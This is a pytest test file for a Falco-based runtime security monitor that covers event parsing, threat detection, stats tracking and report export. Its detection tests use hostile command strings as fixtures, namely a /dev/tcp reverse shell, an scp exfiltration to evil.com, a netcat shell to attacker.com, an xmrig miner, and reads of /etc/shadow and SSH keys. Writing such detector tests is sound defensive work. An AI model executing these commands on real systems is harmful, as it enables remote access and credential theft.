#!/usr/bin/env python3
"""
Unit Tests for Runtime Security Monitor

Tests cover:
- Dataclass creation and serialization (RuntimeEvent, ThreatAlert)
- Enum values (ThreatSeverity, ThreatType)
- Falco availability check (always skip logic)
- Event parsing from Falco JSON
- Threat detection patterns (shell, crypto, sensitive files, etc.)
- Stats tracking
- Log file analysis
- JSON and SARIF export
- Error handling
"""

import json
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Add scripts directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from runtime_security_monitor import (
    RuntimeEvent,
    RuntimeSecurityMonitor,
    ThreatAlert,
    ThreatSeverity,
    ThreatType,
)

# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------


class TestThreatSeverity:
    """Test ThreatSeverity enum"""

    def test_enum_values(self):
        assert ThreatSeverity.CRITICAL.value == "critical"
        assert ThreatSeverity.HIGH.value == "high"
        assert ThreatSeverity.MEDIUM.value == "medium"
        assert ThreatSeverity.LOW.value == "low"
        assert ThreatSeverity.INFO.value == "info"

    def test_all_members_present(self):
        assert len(ThreatSeverity) == 5


class TestThreatType:
    """Test ThreatType enum"""

    def test_enum_values(self):
        assert ThreatType.SHELL_IN_CONTAINER.value == "shell_in_container"
        assert ThreatType.CRYPTO_MINING.value == "cryptocurrency_mining"
        assert ThreatType.SENSITIVE_FILE_ACCESS.value == "sensitive_file_access"
        assert ThreatType.PRIVILEGE_ESCALATION.value == "privilege_escalation"
        assert ThreatType.SUSPICIOUS_NETWORK.value == "suspicious_network"
        assert ThreatType.DATA_EXFILTRATION.value == "data_exfiltration"
        assert ThreatType.MALICIOUS_BINARY.value == "malicious_binary"
        assert ThreatType.REVERSE_SHELL.value == "reverse_shell"
        assert ThreatType.CONTAINER_ESCAPE.value == "container_escape"


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


class TestRuntimeEvent:
    """Test RuntimeEvent dataclass"""

    def test_creation_minimal(self):
        event = RuntimeEvent(
            event_id="evt_001",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.HIGH,
            rule_name="test_rule",
            description="test event",
        )
        assert event.event_id == "evt_001"
        assert event.severity == ThreatSeverity.HIGH
        assert event.container_id is None
        assert event.network_connection is None

    def test_creation_full(self):
        event = RuntimeEvent(
            event_id="evt_002",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.CRITICAL,
            rule_name="crypto_mining",
            description="xmrig detected",
            container_id="abc123",
            container_name="web-app",
            process="xmrig",
            command="xmrig --pool pool.monero.com",
            user="root",
            syscall="execve",
        )
        assert event.container_name == "web-app"
        assert event.process == "xmrig"

    def test_to_dict(self):
        event = RuntimeEvent(
            event_id="evt_003",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.MEDIUM,
            rule_name="test",
            description="test",
        )
        d = event.to_dict()
        assert d["event_id"] == "evt_003"
        assert d["severity"] == "medium"
        assert isinstance(d, dict)

    def test_to_dict_severity_is_string(self):
        event = RuntimeEvent(
            event_id="evt_004",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.CRITICAL,
            rule_name="r",
            description="d",
        )
        d = event.to_dict()
        assert d["severity"] == "critical"


class TestThreatAlert:
    """Test ThreatAlert dataclass"""

    def test_creation(self):
        alert = ThreatAlert(
            alert_id="alert_0001",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.HIGH,
            threat_type=ThreatType.SHELL_IN_CONTAINER,
            description="Shell spawned",
            indicators=["Command: /bin/bash"],
            remediation="Investigate shell spawn",
            confidence=0.85,
        )
        assert alert.alert_id == "alert_0001"
        assert alert.threat_type == ThreatType.SHELL_IN_CONTAINER
        assert alert.confidence == 0.85

    def test_to_dict(self):
        alert = ThreatAlert(
            alert_id="alert_0002",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.CRITICAL,
            threat_type=ThreatType.CRYPTO_MINING,
            description="Mining detected",
            indicators=["Process: xmrig"],
            remediation="Terminate container",
        )
        d = alert.to_dict()
        assert d["severity"] == "critical"
        assert d["threat_type"] == "cryptocurrency_mining"
        assert d["event_count"] == 0

    def test_to_dict_with_events(self):
        event = RuntimeEvent(
            event_id="e1",
            timestamp="t",
            severity=ThreatSeverity.HIGH,
            rule_name="r",
            description="d",
        )
        alert = ThreatAlert(
            alert_id="a1",
            timestamp="t",
            severity=ThreatSeverity.HIGH,
            threat_type=ThreatType.SHELL_IN_CONTAINER,
            description="d",
            indicators=[],
            remediation="r",
            related_events=[event],
        )
        d = alert.to_dict()
        assert d["event_count"] == 1


# ---------------------------------------------------------------------------
# Monitor Initialization (Falco skip logic)
# ---------------------------------------------------------------------------


class TestMonitorInitialization:
    """Test RuntimeSecurityMonitor init and Falco check"""

    @patch("runtime_security_monitor.subprocess.run")
    def test_falco_not_installed(self, mock_run):
        """Falco not found -> warning logged, monitor still created"""
        mock_run.side_effect = FileNotFoundError("falco not found")
        monitor = RuntimeSecurityMonitor()
        assert monitor.falco_path == "falco"
        assert monitor.events == []
        assert monitor.alerts == []

    @patch("runtime_security_monitor.subprocess.run")
    def test_falco_installed(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout=b"Falco 0.37.0")
        monitor = RuntimeSecurityMonitor()
        assert monitor.stats["total_events"] == 0

    @patch("runtime_security_monitor.subprocess.run")
    def test_custom_falco_path(self, mock_run):
        mock_run.side_effect = FileNotFoundError
        monitor = RuntimeSecurityMonitor(falco_path="/usr/local/bin/falco")
        assert monitor.falco_path == "/usr/local/bin/falco"

    @patch("runtime_security_monitor.subprocess.run")
    def test_custom_rules_file(self, mock_run):
        mock_run.side_effect = FileNotFoundError
        monitor = RuntimeSecurityMonitor(rules_file="/etc/falco/custom_rules.yaml")
        assert monitor.rules_file == "/etc/falco/custom_rules.yaml"

    @patch("runtime_security_monitor.subprocess.run")
    def test_falco_timeout(self, mock_run):
        """Falco check timeout -> treated as not installed"""
        import subprocess

        mock_run.side_effect = subprocess.TimeoutExpired(cmd="falco", timeout=5)
        monitor = RuntimeSecurityMonitor()
        assert monitor.events == []


# ---------------------------------------------------------------------------
# Event Parsing
# ---------------------------------------------------------------------------


class TestEventParsing:
    """Test _parse_falco_event"""

    @patch("runtime_security_monitor.subprocess.run")
    def setup_method(self, method, mock_run=None):
        if mock_run:
            mock_run.side_effect = FileNotFoundError
        with patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError):
            self.monitor = RuntimeSecurityMonitor()

    def test_parse_valid_event(self):
        data = {
            "output": "Shell spawned in container",
            "priority": "Critical",
            "rule": "Terminal shell in container",
            "time": "2026-01-01T00:00:00Z",
            "output_fields": {
                "container.id": "abc123",
                "container.name": "web-app",
                "proc.name": "bash",
                "proc.cmdline": "/bin/bash",
                "user.name": "root",
                "evt.type": "execve",
            },
        }
        event = self.monitor._parse_falco_event(data)
        assert event is not None
        assert event.rule_name == "Terminal shell in container"
        assert event.severity == ThreatSeverity.HIGH  # Critical maps to HIGH
        assert event.container_name == "web-app"
        assert event.process == "bash"
        assert event.command == "/bin/bash"

    def test_parse_event_missing_output(self):
        """Events without 'output' key are skipped"""
        data = {"priority": "Warning", "rule": "test"}
        event = self.monitor._parse_falco_event(data)
        assert event is None

    def test_parse_event_with_network(self):
        data = {
            "output": "Suspicious network connection",
            "priority": "Error",
            "rule": "Suspicious network",
            "output_fields": {
                "fd.rip": "10.0.0.1",
                "fd.rport": 4444,
                "fd.lip": "172.17.0.2",
                "fd.lport": 54321,
                "fd.l4proto": "tcp",
            },
        }
        event = self.monitor._parse_falco_event(data)
        assert event is not None
        assert event.network_connection is not None
        assert event.network_connection["destination_ip"] == "10.0.0.1"
        assert event.network_connection["destination_port"] == 4444

    def test_parse_event_priority_mapping(self):
        """Test all Falco priority -> severity mappings"""
        mappings = {
            "Emergency": ThreatSeverity.CRITICAL,
            "Alert": ThreatSeverity.CRITICAL,
            "Critical": ThreatSeverity.HIGH,
            "Error": ThreatSeverity.MEDIUM,
            "Warning": ThreatSeverity.LOW,
            "Notice": ThreatSeverity.INFO,
            "Informational": ThreatSeverity.INFO,
            "Debug": ThreatSeverity.INFO,
        }
        for priority, expected_severity in mappings.items():
            data = {"output": "test", "priority": priority, "rule": "test"}
            event = self.monitor._parse_falco_event(data)
            assert event.severity == expected_severity, f"Priority '{priority}' should map to {expected_severity}"

    def test_parse_event_unknown_priority(self):
        data = {"output": "test", "priority": "Unknown", "rule": "test"}
        event = self.monitor._parse_falco_event(data)
        assert event.severity == ThreatSeverity.INFO


# ---------------------------------------------------------------------------
# Threat Detection
# ---------------------------------------------------------------------------


class TestThreatDetection:
    """Test _check_* methods"""

    @patch("runtime_security_monitor.subprocess.run")
    def setup_method(self, method, mock_run=None):
        with patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError):
            self.monitor = RuntimeSecurityMonitor()

    def _make_event(self, command=None, process=None, file_path=None, network_connection=None):
        return RuntimeEvent(
            event_id="test_evt",
            timestamp="2026-01-01T00:00:00Z",
            severity=ThreatSeverity.INFO,
            rule_name="test",
            description="test",
            command=command,
            process=process,
            file_path=file_path,
            network_connection=network_connection,
            container_name="test-container",
        )

    def test_detect_shell_bash(self):
        event = self._make_event(command="/bin/bash -c whoami")
        self.monitor._check_shell_execution(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.SHELL_IN_CONTAINER

    def test_detect_shell_sh(self):
        event = self._make_event(command="/bin/sh -c ls")
        self.monitor._check_shell_execution(event)
        assert len(self.monitor.alerts) == 1

    def test_no_shell_detection_for_normal_command(self):
        event = self._make_event(command="python3 app.py")
        self.monitor._check_shell_execution(event)
        assert len(self.monitor.alerts) == 0

    def test_no_shell_detection_without_command(self):
        event = self._make_event(command=None)
        self.monitor._check_shell_execution(event)
        assert len(self.monitor.alerts) == 0

    def test_detect_crypto_mining_xmrig(self):
        event = self._make_event(command="xmrig --pool stratum+tcp://pool.com:3333")
        self.monitor._check_crypto_mining(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.CRYPTO_MINING

    def test_detect_crypto_mining_process_name(self):
        event = self._make_event(command="", process="minerd")
        self.monitor._check_crypto_mining(event)
        assert len(self.monitor.alerts) == 1

    def test_detect_sensitive_file_etc_shadow(self):
        event = self._make_event(file_path="/etc/shadow")
        self.monitor._check_sensitive_files(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.SENSITIVE_FILE_ACCESS

    def test_detect_sensitive_file_ssh_key(self):
        event = self._make_event(file_path="/home/user/.ssh/id_rsa")
        self.monitor._check_sensitive_files(event)
        assert len(self.monitor.alerts) == 1

    def test_no_sensitive_file_for_normal_path(self):
        event = self._make_event(file_path="/app/main.py")
        self.monitor._check_sensitive_files(event)
        assert len(self.monitor.alerts) == 0

    def test_no_sensitive_file_without_path(self):
        event = self._make_event(file_path=None)
        self.monitor._check_sensitive_files(event)
        assert len(self.monitor.alerts) == 0

    def test_detect_privilege_escalation_sudo(self):
        event = self._make_event(command="sudo su -")
        self.monitor._check_privilege_escalation(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.PRIVILEGE_ESCALATION

    def test_detect_reverse_shell(self):
        event = self._make_event(command="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        self.monitor._check_reverse_shell(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.REVERSE_SHELL

    def test_detect_data_exfiltration_scp(self):
        event = self._make_event(command="scp /etc/passwd attacker@evil.com:/tmp/")
        self.monitor._check_data_exfiltration(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.DATA_EXFILTRATION

    def test_detect_malicious_binary_nmap(self):
        event = self._make_event(command="nmap -sS 10.0.0.0/24", process="nmap")
        self.monitor._check_malicious_binary(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.MALICIOUS_BINARY

    def test_detect_suspicious_network_nc(self):
        event = self._make_event(command="nc -e /bin/sh attacker.com 4444")
        self.monitor._check_suspicious_network(event)
        assert len(self.monitor.alerts) == 1
        assert self.monitor.alerts[0].threat_type == ThreatType.SUSPICIOUS_NETWORK

    def test_detect_suspicious_port(self):
        event = self._make_event(
            network_connection={"destination_ip": "10.0.0.1", "destination_port": 4444, "protocol": "tcp"}
        )
        self.monitor._check_suspicious_network(event)
        assert len(self.monitor.alerts) == 1

    def test_check_for_threats_dispatches_all(self):
        """_check_for_threats should call all individual checks"""
        event = self._make_event(command="/bin/bash")
        self.monitor._check_for_threats(event)
        # Should detect shell
        assert len(self.monitor.alerts) >= 1


# ---------------------------------------------------------------------------
# Stats Tracking
# ---------------------------------------------------------------------------


class TestStatsTracking:
    """Test _update_stats"""

    @patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError)
    def setup_method(self, method, mock_run=None):
        with patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError):
            self.monitor = RuntimeSecurityMonitor()

    def test_update_stats_severity(self):
        event = RuntimeEvent(
            event_id="e1",
            timestamp="t",
            severity=ThreatSeverity.HIGH,
            rule_name="r",
            description="d",
        )
        self.monitor._update_stats(event)
        assert self.monitor.stats["events_by_severity"]["high"] == 1

    def test_update_stats_container(self):
        event = RuntimeEvent(
            event_id="e1",
            timestamp="t",
            severity=ThreatSeverity.LOW,
            rule_name="r",
            description="d",
            container_name="web-app",
        )
        self.monitor._update_stats(event)
        assert self.monitor.stats["events_by_container"]["web-app"] == 1

    def test_update_stats_no_container(self):
        event = RuntimeEvent(
            event_id="e1",
            timestamp="t",
            severity=ThreatSeverity.LOW,
            rule_name="r",
            description="d",
        )
        self.monitor._update_stats(event)
        assert len(self.monitor.stats["events_by_container"]) == 0

    def test_update_stats_multiple_events(self):
        for i in range(3):
            event = RuntimeEvent(
                event_id=f"e{i}",
                timestamp="t",
                severity=ThreatSeverity.HIGH,
                rule_name="r",
                description="d",
                container_name="app",
            )
            self.monitor._update_stats(event)
        assert self.monitor.stats["events_by_severity"]["high"] == 3
        assert self.monitor.stats["events_by_container"]["app"] == 3


# ---------------------------------------------------------------------------
# monitor_realtime skip logic
# ---------------------------------------------------------------------------


class TestMonitorRealtime:
    """Test monitor_realtime when Falco is not installed"""

    @patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError)
    def test_returns_empty_when_falco_missing(self, mock_run):
        monitor = RuntimeSecurityMonitor()
        alerts = monitor.monitor_realtime(duration_seconds=1)
        assert alerts == []


# ---------------------------------------------------------------------------
# analyze_log_file
# ---------------------------------------------------------------------------


class TestAnalyzeLogFile:
    """Test analyze_log_file"""

    @patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError)
    def setup_method(self, method, mock_run=None):
        with patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError):
            self.monitor = RuntimeSecurityMonitor()

    def test_analyze_nonexistent_file(self):
        alerts = self.monitor.analyze_log_file("/nonexistent/path.json")
        assert alerts == []

    def test_analyze_valid_log_file(self, tmp_path):
        log_file = tmp_path / "falco.json"
        events = [
            {
                "output": "Shell spawned in container",
                "priority": "Critical",
                "rule": "Terminal shell in container",
                "time": "2026-01-01T00:00:00Z",
                "output_fields": {
                    "container.name": "web",
                    "proc.cmdline": "/bin/bash",
                    "proc.name": "bash",
                },
            },
            {
                "output": "Sensitive file read",
                "priority": "Error",
                "rule": "Read sensitive file",
                "time": "2026-01-01T00:00:01Z",
                "output_fields": {
                    "fd.name": "/etc/shadow",
                },
            },
        ]
        log_file.write_text("\n".join(json.dumps(e) for e in events))

        alerts = self.monitor.analyze_log_file(str(log_file))
        assert len(self.monitor.events) == 2
        assert len(alerts) >= 1  # At least shell detection

    def test_analyze_log_with_invalid_json(self, tmp_path):
        log_file = tmp_path / "bad.json"
        log_file.write_text("not json\n{invalid json}\n")
        alerts = self.monitor.analyze_log_file(str(log_file))
        assert alerts == []
        assert len(self.monitor.events) == 0

    def test_analyze_log_with_blank_lines(self, tmp_path):
        log_file = tmp_path / "sparse.json"
        event = {"output": "test", "priority": "Warning", "rule": "test", "output_fields": {}}
        log_file.write_text(f"\n\n{json.dumps(event)}\n\n")
        self.monitor.analyze_log_file(str(log_file))
        assert len(self.monitor.events) == 1


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------


class TestExport:
    """Test export_to_json and export_to_sarif"""

    @patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError)
    def setup_method(self, method, mock_run=None):
        with patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError):
            self.monitor = RuntimeSecurityMonitor()

    def _add_sample_alert(self):
        event = RuntimeEvent(
            event_id="e1",
            timestamp="t",
            severity=ThreatSeverity.CRITICAL,
            rule_name="crypto",
            description="Mining detected",
            container_name="web",
            command="xmrig",
        )
        self.monitor.events.append(event)
        self.monitor._create_alert(
            event=event,
            threat_type=ThreatType.CRYPTO_MINING,
            severity=ThreatSeverity.CRITICAL,
            description="Mining detected",
            indicators=["Process: xmrig"],
            remediation="Terminate container",
            confidence=0.95,
        )

    def test_export_to_json(self, tmp_path):
        self._add_sample_alert()
        output_file = tmp_path / "report.json"
        self.monitor.export_to_json(str(output_file))

        assert output_file.exists()
        data = json.loads(output_file.read_text())
        assert data["statistics"]["total_alerts"] == 1
        assert len(data["alerts"]) == 1
        assert data["alerts"][0]["threat_type"] == "cryptocurrency_mining"

    def test_export_to_sarif(self, tmp_path):
        self._add_sample_alert()
        output_file = tmp_path / "report.sarif"
        self.monitor.export_to_sarif(str(output_file))

        assert output_file.exists()
        data = json.loads(output_file.read_text())
        assert data["version"] == "2.1.0"
        assert len(data["runs"]) == 1
        assert len(data["runs"][0]["results"]) == 1

    def test_export_to_json_empty(self, tmp_path):
        output_file = tmp_path / "empty.json"
        self.monitor.export_to_json(str(output_file))
        data = json.loads(output_file.read_text())
        assert data["statistics"]["total_events"] == 0
        assert data["statistics"]["total_alerts"] == 0

    def test_severity_to_sarif_level(self):
        assert self.monitor._severity_to_sarif_level(ThreatSeverity.CRITICAL) == "error"
        assert self.monitor._severity_to_sarif_level(ThreatSeverity.HIGH) == "error"
        assert self.monitor._severity_to_sarif_level(ThreatSeverity.MEDIUM) == "warning"
        assert self.monitor._severity_to_sarif_level(ThreatSeverity.LOW) == "note"
        assert self.monitor._severity_to_sarif_level(ThreatSeverity.INFO) == "note"


# ---------------------------------------------------------------------------
# Suspicious patterns are defined
# ---------------------------------------------------------------------------


class TestSuspiciousPatterns:
    """Test that suspicious patterns are properly defined"""

    @patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError)
    def test_patterns_defined(self, mock_run):
        monitor = RuntimeSecurityMonitor()
        patterns = monitor.SUSPICIOUS_PATTERNS
        assert "shell_in_container" in patterns
        assert "crypto_mining" in patterns
        assert "suspicious_network" in patterns
        assert "sensitive_files" in patterns
        assert "reverse_shell" in patterns
        assert "privilege_escalation" in patterns
        assert "data_exfiltration" in patterns
        assert "malicious_binary" in patterns

    @patch("runtime_security_monitor.subprocess.run", side_effect=FileNotFoundError)
    def test_suspicious_ports_defined(self, mock_run):
        monitor = RuntimeSecurityMonitor()
        assert 4444 in monitor.SUSPICIOUS_PORTS
        assert 6667 in monitor.SUSPICIOUS_PORTS


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
